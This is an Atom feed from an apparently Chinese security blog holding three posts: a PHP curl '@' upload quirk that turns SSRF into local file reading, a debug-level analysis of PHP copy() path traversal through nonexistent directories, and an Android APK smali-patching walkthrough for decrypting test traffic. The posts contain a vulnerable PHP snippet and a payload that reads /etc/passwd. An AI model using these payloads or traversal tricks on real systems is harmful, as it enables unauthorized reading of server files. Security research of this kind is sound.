<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>blog</title>
  
  <subtitle>blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-12-25T08:03:58.756Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>l@0-f.org</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>php安全 —— [tips] curl</title>
    <link href="http://yoursite.com/2019/12/25/php-%E5%B0%8Ftips-curl/"/>
    <id>http://yoursite.com/2019/12/25/php-小tips-curl/</id>
    <published>2019-12-25T07:21:00.000Z</published>
    <updated>2019-12-25T08:03:58.756Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在php5.5以后使用curl上传文件时，必须使用 <code>CURLFile</code>类才行,而5.5以下的写法很简单,只需要在value加上@与文件路径即可上传文件:</p><blockquote><p>php 5.5:</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'pic'</span>=&gt; <span class="keyword">new</span> \CURLFile(<span class="string">'./1.jpg'</span>),</span><br><span class="line">        <span class="string">'submit'</span> =&gt; <span class="string">'submit'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><blockquote><p>php &lt;5.5</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'pic'</span> =&gt; <span class="string">'@./pic1.jpg'</span>,</span><br><span class="line">    <span class="string">'submit'</span> =&gt; <span class="string">'submit'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="隐患"><a href="#隐患" class="headerlink" title="隐患"></a>隐患</h2><p>假如我们可以控制<code>value</code>,与部分<code>HOST</code>部分，那么可以在<code>php5.5</code>以下把一个SSRF 转化为 LFI:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"http://api."</span>.$_GET[<span class="string">'HOST'</span>].<span class="string">"/api/login"</span>;</span><br><span class="line">$post_data = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"username"</span> =&gt; $_GET[<span class="string">'user'</span>],</span><br><span class="line">    <span class="string">"password"</span> =&gt; $_GET[<span class="string">'passwd'</span>]</span><br><span class="line">);</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch , CURLOPT_URL , $url);</span><br><span class="line">curl_setopt($ch , CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch , CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch , CURLOPT_POSTFIELDS, $post_data);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">echo</span> $output;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong>:</p><p><code>curl http://127.0.0.1/test.php?HOST=web&amp;user=213&amp;passwd=@/etc/passwd</code></p><p><strong>成功获取到本地文件</strong>:</p><p><img src="/images/15772610011187.jpg" alt><br>∫</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在php5.5以后使用curl上传文件时，必须使用 &lt;code&gt;CURLFile&lt;/code&gt;类才行,而5.5以下的写法很简单,只需要在va
      
    
    </summary>
    
    
      <category term="php安全" scheme="http://yoursite.com/tags/php%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>php安全 —— [tips] 跨目录复制文件</title>
    <link href="http://yoursite.com/2019/12/23/php-%E5%B0%8Ftips-file/"/>
    <id>http://yoursite.com/2019/12/23/php-小tips-file/</id>
    <published>2019-12-22T17:55:00.000Z</published>
    <updated>2019-12-22T20:33:31.190Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在我的经验中一直以为使用文件操作相关函数时，windows可以使用 <code>/aa/../</code>,来跳过一个不存在的上级目录,而linux系统不能跳出一个原本不存在的目录。</p><p>而最近我在一次渗透测试的代码审计中，发现php中使用copy函数时，不管是 <code>win/linux</code> 都可以跳出一个原本不存在的上级目录。</p><p>代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">var_dump(copy(<span class="string">'/etc/passwd'</span>,<span class="string">'/tmp/a/../fsf'</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span> $ cat /tmp/a/../fsf</span><br><span class="line">cat: /tmp/a/../fsf: No such file or directory</span><br><span class="line"><span class="meta">&gt;</span> $ cat /tmp/fsf</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>于是我下载了一份<code>php</code>源代码准备进行调试。</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><blockquote><p>由于网上有相关文章就不重复操作了<br>相关调试调试文章：<a href="https://www.jianshu.com/p/f6af567b25a7" target="_blank" rel="noopener">如何在 Mac 上用 Clion 调试 php7 源码</a></p></blockquote><p>在<strong>ext/standard/file.c</strong>的可以找到copy函数的实现,在<strong>php_copy_file_ctx</strong>函数中打上断点:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(copy)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> *source, *target;</span><br><span class="line"><span class="keyword">size_t</span> source_len, target_len;</span><br><span class="line">zval *zcontext = <span class="literal">NULL</span>;</span><br><span class="line">php_stream_context *context;</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (php_copy_file_ctx(source, target, <span class="number">0</span>, context) == SUCCESS) &#123;</span><br><span class="line">RETURN_TRUE;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟入中:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deststream = php_stream_open_wrapper_ex(dest, <span class="string">"wb"</span>, REPORT_ERRORS, <span class="literal">NULL</span>, ctx);</span><br></pre></td></tr></table></figure><p>在<strong>main/fopen_wrappers.c</strong>中的<strong>expand_filepath_with_mode</strong>可以看到会对虚拟路径进行一个处理:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (virtual_file_ex(&amp;new_state, filepath, <span class="literal">NULL</span>, realpath_mode)) &#123;</span><br><span class="line">efree(new_state.cwd);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>紧接着调用<strong>Zend/zend_virtual_cwd.c</strong> 中<strong>tsrm_realpath_r</strong>方法，这个函数会对路径做一些处理,首先该函数有一个while循环。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= start) &#123;</span><br><span class="line">        <span class="keyword">if</span> (link_is_dir) &#123;</span><br><span class="line">            *link_is_dir = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> start;</span><br><span class="line">    &#125;</span><br><span class="line">    i = len;</span><br><span class="line">    <span class="keyword">while</span> (i &gt; start &amp;&amp; !IS_SLASH(path[i<span class="number">-1</span>])) &#123; </span><br><span class="line">        i--; </span><br><span class="line">    &#125;</span><br><span class="line">    assert(i &lt; MAXPATHLEN);</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure><p>当路径最后一位为 <strong>/</strong> 时会进入下一步的流程:</p><p>可以看到的是，判断在末尾是.，或者在当前字节(/)后两位是..的情况下会删除这些字符，具体会以<strong>/</strong>为分隔符并递归调用自己来达到自动删除<strong>..</strong>字符，并跳出上级目录。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (i == len ||</span><br><span class="line">            (i + <span class="number">1</span> == len &amp;&amp; path[i] == <span class="string">'.'</span>)) &#123;</span><br><span class="line">            <span class="comment">/* remove double slashes and '.' */</span></span><br><span class="line">            len = EXPECTED(i &gt; <span class="number">0</span>) ? i - <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">            is_dir = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i + <span class="number">2</span> == len &amp;&amp; path[i] == <span class="string">'.'</span> &amp;&amp; path[i+<span class="number">1</span>] == <span class="string">'.'</span>) &#123; </span><br><span class="line">            <span class="comment">/* remove '..' and previous directory */</span></span><br><span class="line">            is_dir = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (link_is_dir) &#123;</span><br><span class="line">                *link_is_dir = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt;= start + <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> start ? start : len;</span><br><span class="line">            &#125;</span><br><span class="line">            j = tsrm_realpath_r(path, start, i<span class="number">-1</span>, ll, t, use_realpath, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (j &gt; start &amp;&amp; j != (<span class="keyword">size_t</span>)<span class="number">-1</span>) &#123;</span><br><span class="line">                j--;</span><br><span class="line">                assert(i &lt; MAXPATHLEN);</span><br><span class="line">                <span class="keyword">while</span> (j &gt; start &amp;&amp; !IS_SLASH(path[j])) &#123;</span><br><span class="line">                    j--;</span><br><span class="line">                &#125;</span><br><span class="line">                assert(i &lt; MAXPATHLEN);</span><br><span class="line">                <span class="keyword">if</span> (!start) &#123;</span><br><span class="line">                    <span class="comment">/* leading '..' must not be removed in case of relative path */</span></span><br><span class="line">                    <span class="keyword">if</span> (j == <span class="number">0</span> &amp;&amp; path[<span class="number">0</span>] == <span class="string">'.'</span> &amp;&amp; path[<span class="number">1</span>] == <span class="string">'.'</span> &amp;&amp;</span><br><span class="line">                        IS_SLASH(path[<span class="number">2</span>])) &#123;</span><br><span class="line">                        path[<span class="number">3</span>] = <span class="string">'.'</span>;</span><br><span class="line">                        path[<span class="number">4</span>] = <span class="string">'.'</span>;</span><br><span class="line">                        path[<span class="number">5</span>] = DEFAULT_SLASH;</span><br><span class="line">                        j = <span class="number">5</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">                               path[j+<span class="number">1</span>] == <span class="string">'.'</span> &amp;&amp; path[j+<span class="number">2</span>] == <span class="string">'.'</span> &amp;&amp;</span><br><span class="line">                               IS_SLASH(path[j+<span class="number">3</span>])) &#123;</span><br><span class="line">                        j += <span class="number">4</span>;</span><br><span class="line">                        path[j++] = <span class="string">'.'</span>;</span><br><span class="line">                        path[j++] = <span class="string">'.'</span>;</span><br><span class="line">                        path[j] = DEFAULT_SLASH;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!start &amp;&amp; !j) &#123;</span><br><span class="line">                <span class="comment">/* leading '..' must not be removed in case of relative path */</span></span><br><span class="line">                path[<span class="number">0</span>] = <span class="string">'.'</span>;</span><br><span class="line">                path[<span class="number">1</span>] = <span class="string">'.'</span>;</span><br><span class="line">                path[<span class="number">2</span>] = DEFAULT_SLASH;</span><br><span class="line">                j = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> j;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (i &lt;= start + <span class="number">1</span>) &#123;</span><br><span class="line">                j = start;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* some leading directories may be unaccessable */</span></span><br><span class="line">                j = tsrm_realpath_r(path, start, i<span class="number">-1</span>, ll, t, save ? CWD_FILEPATH : use_realpath, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">if</span> (j &gt; start &amp;&amp; j != (<span class="keyword">size_t</span>)<span class="number">-1</span>) &#123;</span><br><span class="line">                    path[j++] = DEFAULT_SLASH;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">memcpy</span>(path+j, tmp+i, len-i+<span class="number">1</span>);</span><br><span class="line">    j += (len-i);</span><br></pre></td></tr></table></figure><p>可以看到,<strong>a</strong>将被替换为<strong>fsf</strong>，也就完成了虚拟路径替换为真实路径的工作:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">path+j =  &quot;/private/tmp/a&quot;</span><br><span class="line">tmp = &quot;/tmp/a/../fsf&quot;</span><br><span class="line">tmp+i = &quot;a&quot;</span><br><span class="line">tmp+i = &quot;fsf&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/15770434438183.jpg?500x500" alt></p><p>在调用open时路径已经是修正后的路径，所以也就成功的完成了在非windows，上级目录不存在的情况下完成<strong>../</strong>跳跃。</p><p><img src="/images/15770440429697.jpg?500x500" alt></p><h2 id="受影响的一些函数"><a href="#受影响的一些函数" class="headerlink" title="受影响的一些函数"></a>受影响的一些函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">copy</span><br><span class="line">file_get_contents</span><br><span class="line">file_put_contents</span><br><span class="line">file</span><br><span class="line">readfile</span><br><span class="line">....</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在我的经验中一直以为使用文件操作相关函数时，windows可以使用 &lt;code&gt;/aa/../&lt;/code&gt;,来跳过一个不存在的上级目录,而
      
    
    </summary>
    
    
      <category term="php安全" scheme="http://yoursite.com/tags/php%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>android安全 —— 修改APP代码,反编译修改smail文件</title>
    <link href="http://yoursite.com/2018/10/31/android%E5%AE%89%E5%85%A8/"/>
    <id>http://yoursite.com/2018/10/31/android安全/</id>
    <published>2018-10-30T19:07:22.000Z</published>
    <updated>2019-12-22T18:07:18.068Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在测试的APP时候,时常遇到通信流量使用AES加密，而加密的KEY每次是随机生成,并使用RSA加密KEY附在数据包之中。</p><p>给测试带来诸多不便,如果可以将每次的KEY固定住就可以很方便进行流量解密工作</p><h2 id="准备前的工作"><a href="#准备前的工作" class="headerlink" title="准备前的工作"></a>准备前的工作</h2><p>俗话说”工欲善其事，必先利其器”，我们准备以下几款工具:</p><table><thead><tr><th>工具名</th><th>作用</th></tr></thead><tbody><tr><td>JEB/JADX/JD-GUI</td><td>图形化反编译APK 或者 JAR文件</td></tr><tr><td>apktool.jar</td><td>反编译smail文件,打包成APK文件</td></tr><tr><td>signer.jar.</td><td>对打包出来的APK文件进行签名</td></tr></tbody></table><h2 id="Android-文件结构"><a href="#Android-文件结构" class="headerlink" title="Android 文件结构"></a>Android 文件结构</h2><p>我们知道andorid 程序是一个后缀为APK的文件，其实这个APK文件是一个压缩包，压缩包内是一些数据与资源文件,解压一个APK文件可以看到以下结构:</p><table><thead><tr><th>文件夹/文件名</th><th>作用</th></tr></thead><tbody><tr><td>META-INF</td><td>存放应用签名和证书的目录</td></tr><tr><td>res</td><td>存放应用程序的资源</td></tr><tr><td>lib</td><td>程序依赖的native库文件</td></tr><tr><td>assets</td><td>打包的静态文件</td></tr><tr><td>AndroidManifest.xml</td><td>应用程序的配置文件</td></tr><tr><td>classes.dex</td><td>dex可执行文件</td></tr><tr><td>resources.arsc</td><td>资源配置文件</td></tr></tbody></table><h2 id="什么是Smali文件"><a href="#什么是Smali文件" class="headerlink" title="什么是Smali文件"></a>什么是Smali文件</h2><p>classes.dex是java源码编译后生成的Dalvik字节码文件，而Smali文件是由Baksmali工具反编译Dalvik字节码得来的，由于该工具支持smali-&gt;dex 文件的编译，所以现在大多使用该smali语法进行编译/反编译。通过反编译Smali文件可以还原java代码。</p><p>Dalvik有自己的语法,可以在下列网站中学习到:</p><p><a href="https://www.jianshu.com/p/2dcfbeab3efc" target="_blank" rel="noopener">https://www.jianshu.com/p/2dcfbeab3efc</a></p><h2 id="使用apktool反编译APK文件"><a href="#使用apktool反编译APK文件" class="headerlink" title="使用apktool反编译APK文件"></a>使用apktool反编译APK文件</h2><blockquote><p>这是我自己写的一个模拟程序:</p></blockquote><img width="300" src="/images/15411449020625.jpg"><p>对应的代码:<br><img src="/images/15411450493220.jpg" alt></p><p>我们使用jadx先反编译这个APK文件:</p><p><img src="/images/15411455537721.jpg" alt></p><p><img src="/images/15411455629499.jpg" alt></p><p>可以看到先判断User类里面的key是否为空,如果不为空的话就随机生成KEY.</p><p>接下来我们使用apktool来反编译出smali文件进行修改:</p><p><code>apktool d app-debug.apk</code></p><p>在目录中寻找到我们要修改的<code>User.smali</code>文件</p><p>可以看到这里是key的变量赋值的地方，我们直接修改保存:</p><p><img src="/images/15411457463572.jpg" alt></p><h2 id="打包文件夹为apk文件"><a href="#打包文件夹为apk文件" class="headerlink" title="打包文件夹为apk文件"></a>打包文件夹为apk文件</h2><p>在apk目录外执行:<br><code>apktool b app-debug</code></p><p>将会重新打包成apk文件，而生成的apk文件在./app-debug/dist/app-debug.apk<br>现在直接是不能运行的，需要对apk文件进行签名才能正常的被安装</p><h2 id="重新签名apk文件"><a href="#重新签名apk文件" class="headerlink" title="重新签名apk文件"></a>重新签名apk文件</h2><p><code>&gt; $ apksigner app-debug.apk</code><br><code>app-debug_signed.apk (1563612 Bytes) √</code></p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><blockquote><p>$ adb install app-debug_signed.apk<br>Success</p></blockquote><img width="300" src="/images/15411461909684.jpg">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在测试的APP时候,时常遇到通信流量使用AES加密，而加密的KEY每次是随机生成,并使用RSA加密KEY附在数据包之中。&lt;/p&gt;
&lt;p&gt;给测
      
    
    </summary>
    
    
      <category term="android安全" scheme="http://yoursite.com/tags/android%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
